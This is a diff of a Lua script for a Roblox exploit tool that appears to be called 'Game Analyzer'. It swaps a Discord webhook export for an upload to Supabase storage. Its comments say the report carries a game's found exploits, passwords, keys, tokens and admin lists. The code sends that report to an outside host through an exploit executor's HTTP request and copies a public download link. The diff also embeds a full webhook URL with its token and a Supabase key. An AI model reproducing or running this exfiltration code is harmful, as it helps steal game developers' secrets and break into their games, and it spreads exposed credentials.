@@ -2581,7 +2581,7 @@ local liteBtn = newInst("TextButton", {
 makeCorner(liteBtn, 6)
 local discordBtn = newInst("TextButton", {
  Size = UDim2.new(0.24, -3, 1, 0), Position = UDim2.new(0.58, 0, 0, 0),
- Text = "👾 DISCORD", Font = Enum.Font.GothamBold, TextSize = 10,
+ Text = "👾 CLOUD", Font = Enum.Font.GothamBold, TextSize = 10,
  TextColor3 = Color3.fromRGB(255,255,255), BackgroundColor3 = Color3.fromRGB(114, 137, 218),
  BorderSizePixel = 0, ZIndex = 12
 }, actF)
@@ -3115,49 +3115,37 @@ exportBtn.MouseButton2Click:Connect(function()
  end)
 end)
 -- ═══════════════════════════════════════════════════════════
--- НОВАЯ СИСТЕМА ЭКСПОРТА В DISCORD (ОБХОД БУФЕРА ОБМЕНА)
+-- СИСТЕМА ЭКСПОРТА В SUPABASE STORAGE (ОБХОД ЛИМИТОВ РАЗМЕРА)
 -- ═══════════════════════════════════════════════════════════
-local DISCORD_PROXY_URL = "https://webhook.newstargeted.com/api/webhooks/1524393077928886403/OFdI2fwZecaobtJK7zaDD-_kSlQrc2uCRBn4a3HhWXAH6zFL1Yp2zWTHStFsWg6UDiNy"
+local SUPABASE_PROJECT_ID = "earidffeokvqgffyioxa"
+local SUPABASE_BUCKET = "Report"
+local SUPABASE_KEY = "sb_publishable_vAuejesqMghio6T2VFXXVQ_Bx3-6GCv"
 
-local function sendFileToDiscord(fileName, fileContent)
+local function uploadToSupabase(fileName, fileContent)
  local HttpService = game:GetService("HttpService")
- local boundary = "----WebKitFormBoundary" .. HttpService:GenerateGUID(false)
+ local uploadUrl = "https://" .. SUPABASE_PROJECT_ID .. ".supabase.co/storage/v1/object/" .. SUPABASE_BUCKET .. "/" .. fileName
  
- -- Создаем JSON-объект сообщения, который ТРЕБУЕТ Discord для вебхука
- local payload = HttpService:JSONEncode({
-     content = "🔬 **Game Analyzer v5.2:** Готов сочный отчёт об уязвимостях и секретах игры, бро! 🚀"
- })
-
- -- Собираем правильный multipart/form-data
- local body = "--" .. boundary .. "\r\n" ..
-              "Content-Disposition: form-data; name=\"payload_json\"\r\n" ..
-              "Content-Type: application/json\r\n\r\n" ..
-              payload .. "\r\n" ..
-              "--" .. boundary .. "\r\n" ..
-              "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"\r\n" ..
-              "Content-Type: text/plain\r\n\r\n" ..
-              fileContent .. "\r\n" ..
-              "--" .. boundary .. "--\r\n"
-              
  local headers = {
-     ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
+     ["apikey"] = SUPABASE_KEY,
+     ["Authorization"] = "Bearer " .. SUPABASE_KEY,
+     ["Content-Type"] = "text/plain",
      ["User-Agent"] = "Roblox/DeltaExploitSuite"
  }
 
  local reqData = {
-     Url = DISCORD_PROXY_URL,
+     Url = uploadUrl,
      Method = "POST",
      Headers = headers,
-     Body = body
+     Body = fileContent
  }
 
  local success, response
- -- Пытаемся использовать самый мощный HTTP-метод исполнителя
+ -- Пытаемся использовать самый мощный HTTP-метод исполнителя (Delta request)
  if _httprequest then
      success, response = pcall(_httprequest, reqData)
      if success and type(response) == "table" then
-         if response.StatusCode == 200 or response.StatusCode == 204 then
-             return true, "Success (Executor Request)"
+         if response.StatusCode == 200 or response.StatusCode == 201 or response.StatusCode == 204 then
+             return true, "Success"
          else
              return false, "HTTP " .. tostring(response.StatusCode) .. ": " .. tostring(response.Body)
          end
@@ -3170,8 +3158,8 @@ local function sendFileToDiscord(fileName, fileContent)
  end)
  
  if success and type(response) == "table" then
-     if response.StatusCode == 200 or response.StatusCode == 204 then
-         return true, "Success (RequestAsync)"
+     if response.StatusCode == 200 or response.StatusCode == 201 or response.StatusCode == 204 then
+         return true, "Success"
      else
          return false, "HTTP " .. tostring(response.StatusCode) .. " -> " .. tostring(response.Body)
      end
@@ -3179,33 +3167,43 @@ local function sendFileToDiscord(fileName, fileContent)
 
  -- Крайний случай - тупой PostAsync
  success, response = pcall(function()
-     return HttpService:PostAsync(DISCORD_PROXY_URL, body, Enum.HttpContentType.ApplicationJson, false, headers)
+     return HttpService:PostAsync(uploadUrl, fileContent, Enum.HttpContentType.TextPlain, false, headers)
  end)
  
  if success then
-     return true, "Success (PostAsync)"
+     return true, "Success"
  else
      return false, tostring(response)
  end
 end
 
 discordBtn.MouseButton1Click:Connect(function()
- discordBtn.Text = "👾 SENDING..."
+ discordBtn.Text = "👾 UPLOADING..."
  task.spawn(function()
-     -- Чтобы избежать лимитов размера (HTTP 520/400), мы шлем сочный LITE-отчет в Дискорд
-     -- Он содержит ВСЕ найденные эксплоиты, пароли, ключи, токены и админов, но без тяжелого мусора.
-     local report = liteReportToString() 
-     local fileName = "Game_Exploits_Report_" .. tostring(DeepData.PlaceId) .. ".txt"
-     local success, resultMessage = sendFileToDiscord(fileName, report)
+     -- Собираем ПОЛНЫЙ, гигантский отчет без ограничений!
+     local report = fullReportToString()
+     local rawFileName = "Full_Game_Report_" .. tostring(DeepData.PlaceId) .. "_" .. tostring(math.random(1000, 9999)) .. ".lua"
+     
+     -- Кодируем имя файла для URL (заменяем пробелы)
+     local fileName = rawFileName:gsub(" ", "_")
+     
+     local success, resultMessage = uploadToSupabase(fileName, report)
      if success then
-         discordBtn.Text = "✅ DISCORD OK"
-         warn("[👾 DISCORD] Сочный отчет успешно отправлен на твой вебхук! Проверяй канал, бро!")
+         local downloadLink = "https://" .. SUPABASE_PROJECT_ID .. ".supabase.co/storage/v1/object/public/" .. SUPABASE_BUCKET .. "/" .. fileName
+         
+         -- Копируем прямую ссылку на скачивание файла в буфер обмена!
+         copyToClipboard(downloadLink)
+         
+         discordBtn.Text = "✅ CLOUD OK"
+         warn("[👾 SUPABASE] Полный отчет (" .. math.floor(#report/1024) .. " KB) успешно залит в Supabase!")
+         warn("[👾 SUPABASE] Прямая ссылка: " .. downloadLink)
+         _origPrint("\n[CLOUD_LINK]: " .. downloadLink)
      else
          discordBtn.Text = "❌ " .. tostring(resultMessage):sub(1, 12):upper()
-         warn("[👾 DISCORD] Ошибка отправки: " .. tostring(resultMessage))
+         warn("[👾 SUPABASE] Ошибка загрузки: " .. tostring(resultMessage))
      end
-     task.wait(4)
-     discordBtn.Text = "👾 DISCORD"
+     task.wait(5)
+     discordBtn.Text = "👾 CLOUD"
  end)
 end)
 execAllBtn.MouseButton1Click:Connect(function()
